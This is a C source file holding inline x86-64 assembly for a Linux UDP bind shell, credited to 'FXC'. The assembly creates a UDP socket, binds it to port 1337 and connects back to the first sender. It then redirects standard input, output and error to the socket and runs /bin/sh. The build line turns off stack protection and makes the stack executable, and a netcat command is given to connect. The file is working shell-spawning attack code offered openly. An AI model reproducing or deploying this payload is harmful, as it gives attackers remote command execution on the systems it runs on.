//x64 Linux UDP bind shell x86-64 intel assembly

/*
* Author:           FXC
* Build/Run:        gcc -masm=intel -z execstack -fno-stack-protector udp_bind_shell_x64_asm.c -o udp_bind_shell_x64_asm
*                   nc -u 127.0.0.1 1337
*/

int main(void)
{
	__asm__(
	// socket(AF_INET, SOCK_DGRAM, IPPROTO_IP)
	"push 2;"
	"pop rdi;"
	"push 2;"
	"pop rsi;"
	"xor rdx, rdx;"
	"push 0x29;"
	"pop rax;"
	"syscall;"
	// bind(sockfd, (struct sockaddr *)&addr, sizeof(addr))
	"push rax;"
	"pop rdi;"
	"mov rdx, 0x0100007f39050002;"
	"push rdx;"
	"push rdx;"
	"mov rsi, rsp;"
	"mov rdx, 0x10;"
	"push 0x31;"
	"pop rax;"
	"syscall;"
	// recvfrom(sockfd, buf, 0x800, MSG_PEEK, (struct sockaddr*)&z, &len);
	"mov rsi, rsp;"
	"push 0x800;"
	"pop rdx;"
	"push 2;"
	"pop r10;"
	"push rdx;"
	"mov r8, rsp;"
	"push 0x10;"
	"mov r9, rsp;"
	"push 0x2d;"
	"pop rax;"
	"syscall;"
	// connect(sockfd, (struct sockaddr *)&z, len)
	"mov rsi, r8;"
	"mov rdx, 0x10;"
	"push 0x2a;"
	"pop rax;"
	"syscall;"
	// dup2(sockfd, 0);
	"xor rsi, rsi;"
	"push 0x21;"
	"pop rax;"
	"syscall;"
	// dup2(sockfd, 1);
	"push 1;"
	"pop rsi;"
	"push 0x21;"
	"pop rax;"
	"syscall;"
	// dup2(sockfd, 2);
	"push 2;"
	"pop rsi;"
	"push 0x21;"
	"pop rax;"
	"syscall;"
	// execve("/bin/sh", NULL, NULL)
	"mov rax, 0x68732f6e69622f;"
	"push rax;"
	"mov rdi, rsp;"
	"xor rsi, rsi;"
	"xor rdx, rdx;"
	"push 0x3b;"
	"pop rax;"
	"syscall;"
	);
}

